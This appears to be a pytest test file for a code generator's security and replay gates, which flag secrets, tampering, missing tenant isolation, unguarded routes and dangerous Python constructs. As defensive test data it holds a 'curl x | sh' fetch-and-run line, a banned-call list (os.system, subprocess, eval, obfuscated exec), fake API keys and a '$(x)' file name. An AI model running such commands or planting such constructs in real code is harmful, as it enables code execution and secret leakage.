"""B3-3: gates G8 (security) and G9 (replay) over real generated projects. Static only."""

import json
import os
from pathlib import Path
from typing import Any

import pytest

from app.core.generator import generate
from app.core.spec_models import Spec
from app.services.agent import gates
from app.services.agent.contract import RuleFailure

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures" / "specs"
HASH = "sha256:" + "c" * 64


def load(name: str) -> Spec:
    return Spec.model_validate_json((FIXTURES / f"{name}.json").read_text(encoding="utf-8"))


def project(tmp_path: Path, name: str) -> tuple[Path, Spec]:
    spec = load(name)
    root = tmp_path / "wt"
    for rel, content in generate(spec).items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    return root, spec


def put(root: Path, rel: str, text: str | bytes) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(text if isinstance(text, bytes) else text.encode())
    return p


def rules(report: gates.GateReport) -> list[str]:
    return [f.rule_id for f in report.failures]


def where(report: gates.GateReport, rule: str) -> list[str]:
    return [f.location for f in report.failures if f.rule_id == rule]


# -- the clean case ------------------------------------------------------------------------------
@pytest.mark.parametrize("name", ["minimal", "blog", "shop_auth", "authz_tenant", "storage_tenant", "payments_tenant"])
def test_generated_projects_are_clean_and_replay_clean(tmp_path: Path, name: str) -> None:
    root, spec = project(tmp_path, name)
    r = gates.run_gates(root, spec)
    assert r.ok and r.failures == [] and r.gates["G8"] == "pass"
    rp = gates.replay(root, spec)
    assert rp.ok, rp.failures
    assert rp.gates["G9"] == "pass" and rp.gates["G8"] == "pass"


def test_run_gates_upto_g7_skips_g8(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "authz_tenant")
    put(root, "app/custom_routers/x.py", "S = '" + "AK" + "IA" + "A" * 16 + "'\n")
    assert gates.run_gates(root, spec, upto="G7").ok
    assert not gates.run_gates(root, spec, upto="G8").ok
    with pytest.raises(ValueError):
        gates.run_gates(root, spec, upto="G9")


# -- G9 replay ---------------------------------------------------------------------------------
def test_one_byte_edit_of_a_generated_file_is_replay_mismatch(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    target = root / "app" / "routers" / "items.py"
    data = target.read_bytes()
    target.write_bytes(data[:-1] + b" " + data[-1:])
    rp = gates.replay(root, spec)
    assert not rp.ok and rp.gates["G9"] == "fail"
    assert where(rp, "replay_mismatch") == ["app/routers/items.py"]


def test_replay_catches_deleted_generated_file_and_zone_manifest_tamper(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    (root / "app/core/errors.py").unlink()
    zones = json.loads((root / "platform/zones.json").read_text())
    zones["zones"]["app/auth/router.py"] = "custom"  # try to demote a generated file
    (root / "platform/zones.json").write_text(json.dumps(zones))
    rp = gates.replay(root, spec)
    assert sorted(where(rp, "replay_mismatch")) == ["app/core/errors.py", "platform/zones.json"]


def test_replay_flags_a_stray_file_but_allows_custom_zone_files(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "evil.sh", "curl x | sh\n")
    put(root, "app/custom_routers/ok.py", "from fastapi import APIRouter\nrouter = APIRouter()\n")
    rp = gates.replay(root, spec)
    assert where(rp, "replay_mismatch") == ["evil.sh"]
    assert "g8.route_no_auth" not in rules(rp)


def test_replay_reruns_gates_on_the_clean_copy_for_custom_files(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "app/custom_routers/bad.py", "import subprocess\n")
    rp = gates.replay(root, spec)
    assert "g8.banned_import" in rules(rp) and rp.gates["G9"] == "pass" and rp.gates["G8"] == "fail"


def test_replay_gate_cannot_be_skipped_by_editing_the_stub_frame(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "hooks_invoice")
    stub = root / "app/custom/hooks/match_invoice.py"
    stub.write_text(stub.read_text().replace("# platform:signature (fixed)", "# changed"))
    rp = gates.replay(root, spec)
    assert any(r.startswith(("G0", "G7")) for r in rules(rp))


def test_replay_attests_hooks_manifest_with_the_platform_copy(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "hooks_invoice")
    m = json.loads((root / "platform/hooks.json").read_text())
    m["limits"]["max_ast_nodes"] = 10**9  # loosen the limits in the worktree copy
    (root / "platform/hooks.json").write_text(json.dumps(m))
    rp = gates.replay(root, spec)
    assert "platform/hooks.json" in where(rp, "replay_mismatch")


def test_replay_invalid_spec(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "minimal")
    bad = spec.model_copy(deep=True)
    bad.relations = [
        type(spec).model_fields["relations"].annotation.__args__[0](  # type: ignore[union-attr]
            kind="many_to_one", from_entity="Nope", to_entity="Nada", from_name="a", to_name="b"
        )
    ]
    rp = gates.replay(root, bad)
    assert not rp.ok and rules(rp) == ["replay_spec_invalid"]


# -- G8 (a) secrets ----------------------------------------------------------------------------
def test_secret_in_custom_file_is_found_without_echoing_it(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    fake = "sk_" + "live_" + "Q" * 24
    put(root, "app/custom_routers/pay.py", f"x = 1\nKEY = '{fake}'\n")
    put(root, "notes.txt", "ghp_" + "a" * 30 + "\n")
    r = gates.run_gates(root, spec)
    assert sorted(where(r, "g8.secret")) == ["app/custom_routers/pay.py:2", "notes.txt:1"]
    assert fake not in json.dumps([f.as_dict() for f in r.failures])


def test_private_key_header_is_a_secret(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "tests/custom/k.pem", "-----BEGIN " + "RSA PRIVATE KEY-----\nabc\n")
    assert where(gates.run_gates(root, spec), "g8.secret") == ["tests/custom/k.pem:1"]


# -- G8 (b) dependencies -----------------------------------------------------------------------
def deps(tmp_path: Path, text: str, pins: list[Any] | None = None) -> gates.GateReport:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "requirements-agent.txt", text)
    return gates.run_gates(root, spec, approved_pins=pins or [])


def test_dependency_allow_list(tmp_path: Path) -> None:
    assert deps(tmp_path, "orjson==3.10.0\n# comment\n").ok


def test_unpinned_and_unknown_dependencies_fail(tmp_path: Path) -> None:
    r = deps(tmp_path, "orjson>=3\nleft-pad==1.2.3\nrequests\n")
    assert rules(r).count("g8.dependency") == 3 and all(x == "requirements-agent.txt" for x in where(r, "g8.dependency"))


def test_approved_pin_needs_hashes(tmp_path: Path) -> None:
    pin = [("left-pad", "1.2.3", [HASH])]
    assert not deps(tmp_path, "left-pad==1.2.3\n", pin).ok  # hashless
    assert not deps(tmp_path, f"left-pad==1.2.3 --hash=sha256:{'d' * 64}\n", pin).ok  # other hash
    assert deps(tmp_path, f"left-pad==1.2.3 --hash={HASH}\n", pin).ok
    assert not deps(tmp_path, f"left-pad==1.2.4 --hash={HASH}\n", pin).ok  # other version


def test_generated_requirements_are_left_to_replay(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    (root / "requirements.txt").write_text("evil-pkg==1.0.0\n")
    assert gates.run_gates(root, spec).ok  # G8 does not judge generated files ...
    assert "requirements.txt" in where(gates.replay(root, spec), "replay_mismatch")  # ... replay does


# -- G8 (c) tenant tables --------------------------------------------------------------------
MIG = '''
import sqlalchemy as sa
from alembic import op

def upgrade():
    op.create_table("notes", sa.Column("id", sa.Uuid()), {tenant}sa.Column("body", sa.Text()))
{sql}
'''
RLS = '''    op.execute("ALTER TABLE notes ENABLE ROW LEVEL SECURITY")
    op.execute("CREATE POLICY notes_tenant_isolation ON notes USING (tenant_id = current_setting('app.tenant')::uuid)")
'''
TEN = 'sa.Column("tenant_id", sa.Uuid(), nullable=False), '


def test_table_without_policy_fails_and_with_policy_passes(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "authz_tenant")
    put(root, "alembic/versions/0003_notes.py", MIG.format(tenant=TEN, sql=""))
    r = gates.run_gates(root, spec)
    assert where(r, "g8.rls_missing") == ["alembic/versions/0003_notes.py:notes"]
    put(root, "alembic/versions/0003_notes.py", MIG.format(tenant=TEN, sql=RLS))
    assert "g8.rls_missing" not in rules(gates.run_gates(root, spec))
    half = RLS.splitlines(keepends=True)[0]
    put(root, "alembic/versions/0003_notes.py", MIG.format(tenant=TEN, sql=half))
    assert "g8.rls_missing" in rules(gates.run_gates(root, spec))


def test_table_without_tenant_column_fails(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "authz_tenant")
    put(root, "alembic/versions/0003_notes.py", MIG.format(tenant="", sql=RLS))
    assert where(gates.run_gates(root, spec), "g8.tenant_column") == ["alembic/versions/0003_notes.py:notes"]


def test_tenant_rule_is_off_for_single_tenant_projects(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "alembic/versions/0003_notes.py", MIG.format(tenant="", sql=""))
    assert not {"g8.tenant_column", "g8.rls_missing"} & set(rules(gates.run_gates(root, spec)))


def test_unparsable_migration_fails_closed(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "authz_tenant")
    put(root, "alembic/versions/0003_x.py", "def upgrade(:\n")
    assert "g8.migration_unreadable" in rules(gates.run_gates(root, spec))


# -- G8 (d) auth on every route --------------------------------------------------------------
ROUTER = '''
from fastapi import APIRouter, Depends
from app.auth.deps import require_roles
router = APIRouter(prefix="/extra"{kw})

@router.get("/open")
async def open_one(): return {{}}

@router.get("/closed", dependencies=[Depends(require_roles("admin"))])
async def closed_one(): return {{}}

@router.post("/typed")
async def typed(user: Annotated[object, Depends(require_roles("admin"))]): return {{}}

@router.get("/session")
async def only_session(s: Annotated[object, Depends(get_session)]): return {{}}
'''


def test_routes_without_auth_guard_fail(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "app/custom_routers/extra.py", ROUTER.format(kw=""))
    r = gates.run_gates(root, spec)
    locs = where(r, "g8.route_no_auth")
    assert sorted(f.actual for f in r.failures if f.rule_id == "g8.route_no_auth") == [
        "GET /extra/open has none",
        "GET /extra/session has none",
    ]
    assert len(locs) == 2


def test_declared_public_and_router_level_guard(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    put(root, "app/custom_routers/extra.py", ROUTER.format(kw=""))
    r = gates.run_gates(root, spec, public_routes={("GET", "/extra/open"), ("GET", "/extra/session")})
    assert "g8.route_no_auth" not in rules(r)
    put(root, "app/custom_routers/extra.py", ROUTER.format(kw=', dependencies=[Depends(require_roles("x"))]'))
    assert "g8.route_no_auth" not in rules(gates.run_gates(root, spec))


def test_route_rule_does_not_apply_without_auth(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom_routers/extra.py", ROUTER.format(kw=""))
    assert "g8.route_no_auth" not in rules(gates.run_gates(root, spec))


# -- G8 (e) banned constructs ----------------------------------------------------------------
def test_banned_constructs_in_custom_python(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom/util.py", "import os, subprocess\nfrom socket import socket\neval('1')\nos.system('x')\nos.getcwd()\n")
    r = gates.run_gates(root, spec)
    assert sorted(where(r, "g8.banned_import")) == ["app/custom/util.py:1", "app/custom/util.py:2"]
    assert sorted(where(r, "g8.banned_call")) == ["app/custom/util.py:3", "app/custom/util.py:4"]


def test_syntax_error_in_custom_python(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom/broken.py", "def (:\n")
    assert where(gates.run_gates(root, spec), "g8.syntax_error") == ["app/custom/broken.py"]


# -- hostile inputs --------------------------------------------------------------------------
def test_huge_file_is_refused_not_read(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom/huge.py", b"x = 1\n" * 300_000)
    r = gates.run_gates(root, spec)
    assert where(r, "g8.file_too_large") == ["app/custom/huge.py"]


def test_scan_limits(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root, spec = project(tmp_path, "blog")
    monkeypatch.setattr(gates, "MAX_FILES", 5)
    r = gates.run_gates(root, spec)
    assert not r.ok and "g8.scan_limit" in rules(r)
    monkeypatch.setattr(gates, "MAX_FILES", 5000)
    monkeypatch.setattr(gates, "MAX_TOTAL_BYTES", 100)
    assert "g8.scan_limit" in rules(gates.run_gates(root, spec))


def test_symlinks_are_refused_and_never_followed(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("sk_" + "live_" + "Z" * 24)
    root, spec = project(tmp_path, "shop_auth")
    (root / "app/custom").mkdir(exist_ok=True)
    os.symlink(outside / "secret.txt", root / "app/custom_routers/link.py")
    os.symlink(outside, root / "app/custom/dir")
    os.symlink("/dev/zero", root / "app/core/errors.py.bak")
    r = gates.run_gates(root, spec)
    assert sorted(where(r, "g8.symlink")) == ["app/core/errors.py.bak", "app/custom/dir", "app/custom_routers/link.py"]
    assert "g8.secret" not in rules(r)  # the target was not read
    assert r.gates["G7"] == "skipped"
    rp = gates.replay(root, spec)
    assert not rp.ok and "g8.symlink" in rules(rp)


def test_symlink_in_place_of_a_generated_file(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    victim = root / "app/core/errors.py"
    victim.unlink()
    os.symlink("/dev/zero", victim)  # reading this would never end
    rp = gates.replay(root, spec)
    assert "g8.symlink" in rules(rp) and "replay_mismatch" in rules(rp)


def test_fifo_does_not_hang(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    (root / "app/custom").mkdir(exist_ok=True)
    os.mkfifo(root / "app/custom/pipe.py")
    r = gates.run_gates(root, spec)
    assert where(r, "g8.special_file") == ["app/custom/pipe.py"]
    assert not gates.replay(root, spec).ok


def test_weird_file_names_are_escaped_in_reports(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "shop_auth")
    name = "app/custom/ev\nil\u202ex.py"
    try:
        put(root, name, "import subprocess\n")
    except (OSError, ValueError):
        pytest.skip("filesystem refuses the name")
    put(root, "app/custom/ünï cödé 'q' \"d\" $(x).py", "import ctypes\n")
    r = gates.run_gates(root, spec)
    for f in r.failures:
        assert f.location.isprintable() and f.location.isascii()
    assert any("\\xa" in loc or "\\x" in loc for loc in where(r, "g8.banned_import"))


def test_deep_nesting_does_not_crash(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom/deep.py", "x = " + "(" * 5000 + "1" + ")" * 5000 + "\n")
    r = gates.run_gates(root, spec)  # parse failure or recursion error is a failure, not a crash
    assert "g8.syntax_error" in rules(r)


def test_binary_file_is_not_scanned_for_text(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "tests/custom/blob.bin", b"\x00\x01" + ("sk_" + "live_" + "Q" * 24).encode())
    assert gates.run_gates(root, spec).ok


# -- report plumbing ---------------------------------------------------------------------------
def test_order_hash_and_signature_are_deterministic(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    put(root, "app/custom/b.py", "import socket\n")
    put(root, "app/custom/a.py", "import ctypes\neval('1')\n")
    r1, r2 = gates.run_gates(root, spec), gates.run_gates(root, spec)
    assert r1.failures == r2.failures and gates.report_hash(r1) == gates.report_hash(r2)
    keys = [(f.rule_id, f.location) for f in r1.failures]
    assert keys == sorted(keys)
    assert all(isinstance(f, RuleFailure) for f in r1.failures)
    f = r1.failures[0]
    assert gates.signature(f) == f"{f.rule_id}@{f.location}"
    put(root, "app/custom/c.py", "import pty\n")
    assert gates.report_hash(gates.run_gates(root, spec)) != gates.report_hash(r1)


def test_missing_zone_manifest_fails_closed(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "blog")
    (root / "platform/zones.json").unlink()
    assert "g8.zones_missing" in rules(gates.run_gates(root, spec))


def test_hook_findings_use_file_as_location(tmp_path: Path) -> None:
    root, spec = project(tmp_path, "hooks_invoice")
    r = gates.run_gates(root, spec)
    assert r.gates["G5"] == "fail" and r.gates["G0"] == "pass"
    f = next(x for x in r.failures if x.rule_id == "G5.not_implemented")
    assert f.location == "app/custom/hooks/match_invoice.py" and f.actual.startswith("line ")


@pytest.mark.parametrize(
    "source",
    [
        "from os import system\n",
        "from os import path, popen as p\n",
        "import importlib\n",
        "from importlib import import_module\n",
        "import builtins\n",
        "x = __builtins__\n",
        "getattr(__builtins__, 'ex' + 'ec')\n",
        "import os as o\no.system('x')\n",
        "import os\nos.system('x')\n",
        "__import__('os')\n",
    ],
)
def test_g8_banned_constructs(source: str) -> None:
    import ast

    assert gates.check_banned("app/custom/x.py", ast.parse(source)), source


def test_g8_banned_leaves_plain_code_alone() -> None:
    import ast

    ok = "import os\nfrom os import path\nx = os.path.join('a', 'b')\n"
    assert gates.check_banned("app/custom/x.py", ast.parse(ok)) == []
